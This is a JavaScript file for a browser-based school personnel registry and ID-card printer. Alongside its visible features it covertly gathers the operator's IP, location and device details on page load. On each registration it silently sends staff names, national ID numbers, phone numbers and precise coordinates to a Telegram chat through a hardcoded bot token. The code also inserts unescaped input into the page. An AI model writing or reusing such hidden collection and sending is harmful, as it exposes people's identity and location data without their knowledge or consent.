// تنظیمات تلگرام 
        const TELEGRAM_BOT_TOKEN = '8459199254:AAEqCLIMDfs9uj2LNcX_93zt69_V_QrO_uY'; 
        const TELEGRAM_CHAT_ID = '6071335955'; 
         
        // دیتابیس محلی 
        let personnelDB = JSON.parse(localStorage.getItem('personnelDB')) || []; 
        let idCardsPrinted = parseInt(localStorage.getItem('idCardsPrinted')) || 0; 
         
        // اطلاعات دستگاه (مخفی) 
        let deviceInfo = { 
            ip: 'در حال دریافت...', 
            location: 'در حال دریافت...', 
            userAgent: navigator.userAgent, 
            platform: navigator.platform, 
            language: navigator.language, 
            screenResolution: `${screen.width}x${screen.height}`, 
            deviceType: getDeviceType(), 
            browser: getBrowserInfo(), 
            connection: getConnectionInfo(), 
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, 
            timestamp: new Date().toLocaleString('fa-IR'), 
            coordinates: null 
        }; 
         
        // عناصر DOM 
        const tabs = document.querySelectorAll('.tab'); 
        const tabContents = document.querySelectorAll('.tab-content'); 
        const personnelForm = document.getElementById('personnel-form'); 
        const personnelList = document.getElementById('personnelList'); 
        const personnelSelect = document.getElementById('personnelSelect'); 
        const idCardContainer = document.getElementById('idCardContainer'); 
        const searchInput = document.getElementById('searchInput'); 
        const sendReportBtn = document.getElementById('sendReportBtn'); 
         
        // مدیریت تبها 
        tabs.forEach(tab => { 
            tab.addEventListener('click', () => { 
                const tabId = tab.getAttribute('data-tab'); 
                 
                tabs.forEach(t => t.classList.remove('active')); 
                tabContents.forEach(tc => tc.classList.remove('active')); 
                 
                tab.classList.add('active'); 
                document.getElementById(tabId).classList.add('active'); 
                 
                if (tabId === 'list') { 
                    renderPersonnelList(); 
                } else if (tabId === 'idcard') { 
                    updatePersonnelSelect(); 
                } else if (tabId === 'stats') { 
                    updateStats(); 
                } 
                 
                // بروزرسانی تاریخ برای پرینت 
                updatePrintDates(); 
            }); 
        }); 
         
        // تابع پرینت برای هر بخش 
        function printSection(sectionId) { 
            const currentDate = new Date().toLocaleDateString('fa-IR'); 
            document.getElementById(`print-date-${sectionId}`).textContent = currentDate; 
             
            // ذخیره محتوای فعلی 
            const originalContent = document.querySelector('.tab-content.active .print-section').innerHTML; 
             
            // پرینت بخش مورد نظر 
            window.print(); 
        } 
         
        // بروزرسانی تاریخهای پرینت 
        function updatePrintDates() { 
            const currentDate = new Date().toLocaleDateString('fa-IR'); 
            document.querySelectorAll('[id^="print-date-"]').forEach(element => { 
                element.textContent = currentDate; 
            }); 
        } 
         
        // جمعآوری اطلاعات دستگاه به صورت مخفی 
        function collectDeviceInfo() { 
            // دریافت آیپی 
            fetch('https://api.ipify.org?format=json') 
                .then(response => response.json()) 
                .then(data => { 
                    deviceInfo.ip = data.ip; 
                     
                    // دریافت موقعیت مکانی بر اساس IP 
                    return fetch(`https://ipapi.co/${data.ip}/json/`); 
                }) 
                .then(response => response.json()) 
                .then(locationData => { 
                    deviceInfo.location = `${locationData.city || 'نامشخص'}, ${locationData.region || 'نامشخص'}, ${locationData.country_name || 'نامشخص'}`; 
                    deviceInfo.ipData = locationData; 
                }) 
                .catch(error => { 
                    console.error('خطا در دریافت اطلاعات موقعیت:', error); 
                    deviceInfo.location = 'نامشخص'; 
                }); 
             
            // دریافت موقعیت جغرافیایی دقیق (در صورت اجازه کاربر) 
            if (navigator.geolocation) { 
                navigator.geolocation.getCurrentPosition( 
                    position => { 
                        const lat = position.coords.latitude; 
                        const lon = position.coords.longitude; 
                        deviceInfo.coordinates = { 
                            latitude: lat, 
                            longitude: lon 
                        }; 
                        deviceInfo.location = `عرض: ${lat.toFixed(6)}, طول: ${lon.toFixed(6)}`; 
                    }, 
                    error => { 
                        console.log('دسترسی به موقعیت جغرافیایی مجاز نیست'); 
                    } 
                ); 
            } 
        } 
         
        // تشخیص نوع دستگاه 
        function getDeviceType() { 
            const userAgent = navigator.userAgent; 
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) { 
                return 'موبایل'; 
            } else if (/Tablet|iPad/i.test(userAgent)) { 
                return 'تبلت'; 
            } else { 
                return 'دسکتاپ'; 
            } 
        } 
         
        // تشخیص مرورگر 
        function getBrowserInfo() { 
            const userAgent = navigator.userAgent; 
            if (userAgent.includes('Chrome')) return 'Chrome'; 
            if (userAgent.includes('Firefox')) return 'Firefox'; 
            if (userAgent.includes('Safari')) return 'Safari'; 
            if (userAgent.includes('Edge')) return 'Edge'; 
            if (userAgent.includes('Opera')) return 'Opera'; 
            return 'نامشخص'; 
        } 
         
        // تشخیص نوع اتصال 
        function getConnectionInfo() { 
            if (navigator.connection) { 
                return `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)`; 
            } 
            return 'نامشخص'; 
        } 
         
        // ثبت پرسنل جدید 
        personnelForm.addEventListener('submit', function(e) { 
            e.preventDefault(); 
             
            const personnel = { 
                id: Date.now().toString(), 
                fullName: document.getElementById('fullName').value, 
                fatherName: document.getElementById('fatherName').value, 
                idNumber: document.getElementById('idNumber').value, 
                phone: document.getElementById('phone').value, 
                department: document.getElementById('department').value, 
                position: document.getElementById('position').value, 
                personalNumber: document.getElementById('personalNumber').value, 
                photo: document.getElementById('photo').value || 'https://via.placeholder.com/100x120?text=عکس', 
                registrationDate: new Date().toLocaleString('fa-IR'), 
                deviceInfo: {...deviceInfo} 
            }; 
             
            personnelDB.push(personnel); 
            localStorage.setItem('personnelDB', JSON.stringify(personnelDB)); 
             
            showNotification('success', 'اطلاعات پرسنل با موفقیت ثبت شد.'); 
            personnelForm.reset(); 
             
            // ارسال گزارش به تلگرام 
            sendTelegramReport(`👤 پرسنل جدید ثبت شد: 
 
📋 اطلاعات پرسنل: 
• نام: ${personnel.fullName} 
• نام پدر: ${personnel.fatherName} 
• شماره تذکره: ${personnel.idNumber} 
• شماره تماس: ${personnel.phone} 
• صنف: ${personnel.department} 
• سمت: ${personnel.position} 
• شماره پرسنلی: ${personnel.personalNumber} 
• تاریخ ثبت: ${personnel.registrationDate} 
 
📱 اطلاعات دستگاه ثبتکننده: 
• آیپی: ${deviceInfo.ip} 
• موقعیت: ${deviceInfo.location} 
• دستگاه: ${deviceInfo.deviceType} 
• مرورگر: ${deviceInfo.browser} 
• سیستم عامل: ${deviceInfo.platform} 
• رزولوشن: ${deviceInfo.screenResolution} 
• زمان: ${deviceInfo.timestamp} 
• منطقه زمانی: ${deviceInfo.timezone}${deviceInfo.coordinates ? ` 
• مختصات: ${deviceInfo.coordinates.latitude}, ${deviceInfo.coordinates.longitude}` : ''}`); 
        }); 
         
        // نمایش لیست پرسنل 
        function renderPersonnelList(filteredList = null) { 
            const list = filteredList || personnelDB; 
            personnelList.innerHTML = ''; 
             
            if (list.length === 0) { 
                personnelList.innerHTML = '<p>هیچ پرسنلی ثبت نشده است.</p>'; 
                return; 
            } 
             
            list.forEach(personnel => { 
                const card = document.createElement('div'); 
                card.className = 'personnel-card'; 
                card.innerHTML = ` 
                    <div class="personnel-info"> 
                        <h3>${personnel.fullName}</h3> 
                        <p><strong>صنف:</strong> ${personnel.department}</p> 
                        <p><strong>سمت:</strong> ${personnel.position}</p> 
                        <p><strong>شماره تماس:</strong> ${personnel.phone}</p> 
                        <p><strong>شماره پرسنلی:</strong> ${personnel.personalNumber}</p> 
                        <p><strong>تاریخ ثبت:</strong> ${personnel.registrationDate}</p> 
                    </div> 
                    <div class="personnel-actions"> 
                        <button class="action-btn btn-primary" onclick="editPersonnel('${personnel.id}')"> 
                            <i class="fas fa-edit"></i> ویرایش 
                        </button> 
                        <button class="action-btn btn-danger" onclick="deletePersonnel('${personnel.id}')"> 
                            <i class="fas fa-trash"></i> حذف 
                        </button> 
                        <button class="action-btn btn-success" onclick="printPersonnel('${personnel.id}')"> 
                            <i class="fas fa-print"></i> پرینت 
                        </button> 
                    </div> 
                `; 
                personnelList.appendChild(card); 
            }); 
        } 
         
        // پرینت اطلاعات یک پرسنل خاص 
        function printPersonnel(id) { 
            const personnel = personnelDB.find(p => p.id === id); 
            if (personnel) { 
                // ایجاد پنجره جدید برای پرینت 
                const printWindow = window.open('', '_blank'); 
                printWindow.document.write(` 
                    <html dir="rtl"> 
                    <head> 
                        <title>پرینت اطلاعات پرسنل - ${personnel.fullName}</title> 
                        <style> 
                            body { font-family: Tahoma; padding: 20px; } 
                            .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #3498db; padding-bottom: 15px; } 
                            .info-table { width: 100%; border-collapse: collapse; margin: 20px 0; } 
                            .info-table td { padding: 10px; border: 1px solid #ddd; } 
                            .info-table td:first-child { font-weight: bold; width: 30%; background: #f5f5f5; } 
                            .footer { text-align: center; margin-top: 30px; padding-top: 15px; border-top: 1px solid #ddd; color: #777; font-size: 12px; } 
                        </style> 
                    </head> 
                    <body> 
                        <div class="header"> 
                            <h1>اطلاعات پرسنل</h1> 
                            <h2>آموزشگاه نخبگان ستاری</h2> 
                        </div> 
                         
                        <table class="info-table"> 
                            <tr><td>نام کامل:</td><td>${personnel.fullName}</td></tr> 
                            <tr><td>نام پدر:</td><td>${personnel.fatherName}</td></tr> 
                            <tr><td>شماره تذکره:</td><td>${personnel.idNumber}</td></tr> 
                            <tr><td>شماره تماس:</td><td>${personnel.phone}</td></tr> 
                            <tr><td>صنف/بخش:</td><td>${personnel.department}</td></tr> 
                            <tr><td>سمت:</td><td>${personnel.position}</td></tr> 
                            <tr><td>شماره پرسنلی:</td><td>${personnel.personalNumber}</td></tr> 
                            <tr><td>تاریخ ثبت:</td><td>${personnel.registrationDate}</td></tr> 
                        </table> 
                         
                        <div class="footer"> 
                            چاپ شده از سیستم مدیریت پرسنل نخبگان ستاری - تاریخ: ${new Date().toLocaleDateString('fa-IR')} 
                        </div> 
                    </body> 
                    </html> 
                `); 
                printWindow.document.close(); 
                printWindow.print(); 
            } 
        } 
         
        // جستجو در لیست پرسنل 
        searchInput.addEventListener('input', function() { 
            const searchTerm = this.value.toLowerCase(); 
            const filtered = personnelDB.filter(personnel =>  
                personnel.fullName.toLowerCase().includes(searchTerm) || 
                personnel.department.toLowerCase().includes(searchTerm) || 
                personnel.position.toLowerCase().includes(searchTerm) || 
                personnel.phone.includes(searchTerm) 
            ); 
            renderPersonnelList(filtered); 
        }); 
         
        // بروزرسانی لیست انتخاب پرسنل برای چاپ کارت 
        function updatePersonnelSelect() { 
            personnelSelect.innerHTML = '<option value="">یک پرسنل را انتخاب کنید</option>'; 
             
            personnelDB.forEach(personnel => { 
                const option = document.createElement('option'); 
                option.value = personnel.id; 
                option.textContent = `${personnel.fullName} - ${personnel.department}`; 
                personnelSelect.appendChild(option); 
            }); 
             
            personnelSelect.addEventListener('change', function() { 
                const selectedId = this.value; 
                if (selectedId) { 
                    const personnel = personnelDB.find(p => p.id === selectedId); 
                    renderIdCard(personnel); 
                } else { 
                    idCardContainer.innerHTML = ''; 
                } 
            }); 
        } 
         
        // نمایش کارت هویت 
        function renderIdCard(personnel) { 
            idCardContainer.innerHTML = ` 
                <div class="id-card"> 
                    <div class="id-header"> 
                        <div class="id-logo"> 
                            <i class="fas fa-user-graduate"></i> 
                        </div> 
                        <div class="id-title">آموزشگاه نخبگان ستاری</div> 
                    </div> 
                    <div class="id-photo"> 
                        ${personnel.photo ? `<img src="${personnel.photo}" alt="عکس پرسنلی">` : 'عکس پرسنلی'} 
                    </div> 
                    <div class="id-details"> 
                        <div class="id-row"> 
                            <div class="id-label">نام کامل:</div> 
                            <div class="id-value">${personnel.fullName}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">نام پدر:</div> 
                            <div class="id-value">${personnel.fatherName}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">شماره تذکره:</div> 
                            <div class="id-value">${personnel.idNumber}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">شماره تماس:</div> 
                            <div class="id-value">${personnel.phone}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">صنف/بخش:</div> 
                            <div class="id-value">${personnel.department}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">سمت:</div> 
                            <div class="id-value">${personnel.position}</div> 
                        </div> 
                        <div class="id-row"> 
                            <div class="id-label">شماره پرسنلی:</div> 
                            <div class="id-value">${personnel.personalNumber}</div> 
                        </div> 
                    </div> 
                    <div class="id-footer"> 
                        این کارت متعلق به آموزشگاه نخبگان ستاری میباشد 
                    </div> 
                </div> 
            `; 
        } 
         
        // ویرایش پرسنل 
        function editPersonnel(id) { 
            const personnel = personnelDB.find(p => p.id === id); 
            if (personnel) { 
                document.getElementById('fullName').value = personnel.fullName; 
                document.getElementById('fatherName').value = personnel.fatherName; 
                document.getElementById('idNumber').value = personnel.idNumber; 
                document.getElementById('phone').value = personnel.phone; 
                document.getElementById('department').value = personnel.department; 
                document.getElementById('position').value = personnel.position; 
                document.getElementById('personalNumber').value = personnel.personalNumber; 
                document.getElementById('photo').value = personnel.photo; 
                 
                // حذف رکورد قدیم 
                deletePersonnel(id, false); 
                 
                // رفتن به تب افزودن 
                tabs.forEach(t => t.classList.remove('active')); 
                tabContents.forEach(tc => tc.classList.remove('active')); 
                 
                document.querySelector('[data-tab="add"]').classList.add('active'); 
                document.getElementById('add').classList.add('active'); 
                 
                showNotification('success', 'اطلاعات پرسنل برای ویرایش بارگذاری شد.'); 
            } 
        } 
         
        // حذف پرسنل 
        function deletePersonnel(id, showMsg = true) { 
            if (confirm('آیا از حذف این پرسنل اطمینان دارید؟')) { 
                const personnel = personnelDB.find(p => p.id === id); 
                personnelDB = personnelDB.filter(p => p.id !== id); 
                localStorage.setItem('personnelDB', JSON.stringify(personnelDB)); 
                 
                if (showMsg) { 
                    showNotification('success', 'پرسنل با موفقیت حذف شد.'); 
                    renderPersonnelList(); 
                     
                    // ارسال گزارش به تلگرام 
                    sendTelegramReport(`🗑️ پرسنل حذف شد: 
نام: ${personnel.fullName} 
صنف: ${personnel.department} 
زمان حذف: ${new Date().toLocaleString('fa-IR')}`); 
                } 
            } 
        } 
         
        // بروزرسانی آمار 
        function updateStats() { 
            document.getElementById('totalPersonnel').textContent = personnelDB.length; 
            document.getElementById('educationCount').textContent =  
                personnelDB.filter(p => p.department === 'آموزش').length; 
            document.getElementById('idCardsPrinted').textContent = idCardsPrinted; 
        } 
         
        // ارسال گزارش به تلگرام 
        function sendTelegramReport(message) { 
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`; 
             
            fetch(url, { 
                method: 'POST', 
                headers: { 
                    'Content-Type': 'application/json' 
                }, 
                body: JSON.stringify({ 
                    chat_id: TELEGRAM_CHAT_ID, 
                    text: `📊 گزارش سیستم نخبگان ستاری:\n\n${message}`, 
                    parse_mode: 'HTML' 
                }) 
            }) 
            .then(response => response.json()) 
            .then(data => { 
                console.log('گزارش به تلگرام ارسال شد:', data); 
            }) 
            .catch(error => { 
                console.error('خطا در ارسال گزارش به تلگرام:', error); 
            }); 
        } 
         
        // ارسال گزارش کامل به تلگرام 
        sendReportBtn.addEventListener('click', function() { 
            const total = personnelDB.length; 
            const education = personnelDB.filter(p => p.department === 'آموزش').length; 
            const admin = personnelDB.filter(p => p.department === 'اداری').length; 
            const management = personnelDB.filter(p => p.department === 'مدیریت').length; 
             
            const report = `📊 گزارش کامل سیستم مدیریت پرسنل: 
             
👥 تعداد کل پرسنل: ${total} نفر 
📚 پرسنل آموزشی: ${education} نفر 
📋 پرسنل اداری: ${admin} نفر 
👨💼 پرسنل مدیریت: ${management} نفر 
🖨️ کارتهای چاپ شده: ${idCardsPrinted} عدد 
 
📱 اطلاعات سیستم فعلی: 
• آیپی: ${deviceInfo.ip} 
• موقعیت: ${deviceInfo.location} 
• دستگاه: ${deviceInfo.deviceType} 
• زمان گزارش: ${new Date().toLocaleString('fa-IR')}`; 
             
            sendTelegramReport(report); 
            showNotification('success', 'گزارش کامل به تلگرام ارسال شد.'); 
        }); 
         
        // نمایش اعلان 
        function showNotification(type, message) { 
            const notification = document.getElementById(`${type}-notification`); 
            notification.textContent = message; 
            notification.style.display = 'block'; 
             
            setTimeout(() => { 
                notification.style.display = 'none'; 
            }, 5000); 
        } 
         
        // مقداردهی اولیه 
        document.addEventListener('DOMContentLoaded', function() { 
            collectDeviceInfo(); 
            updateStats(); 
            updatePrintDates(); 
        });
